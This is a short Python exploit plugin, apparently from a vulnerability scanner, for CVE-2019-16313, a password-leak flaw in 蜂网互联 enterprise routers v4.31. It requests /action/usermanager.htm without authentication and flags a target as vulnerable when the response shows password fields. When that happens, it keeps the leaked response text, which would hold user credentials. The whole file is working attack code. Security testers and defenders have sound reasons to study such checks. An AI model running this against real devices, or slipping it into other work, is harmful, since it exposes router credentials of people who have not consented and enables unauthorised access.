#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
from colorama import init,Fore
init(autoreset=True)
def msg():
  ret = {

      'links'     :  'https://peiqi.wgpsec.org/wiki/iot/蜂网互联/蜂网互联 企业级路由器v4.31 密码泄露漏洞 CVE-2019-16313.html',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   '蜂网互联 企业级路由器v4.31 密码泄露(CVE-2019-16313)漏洞',

      'level'     :   'high',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret

def run(url,ua):
  ret = msg()
  headers = {'User-Agent': ua}
  target = '/action/usermanager.htm'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and "pwd" in res.text and 'status' in res.text and 'rows' in res.text:
      ret['huixian'] = res.text
      ret['ifbug'] = True
      res.close()
      return ret
    else:
      return ret
  except:
    return ret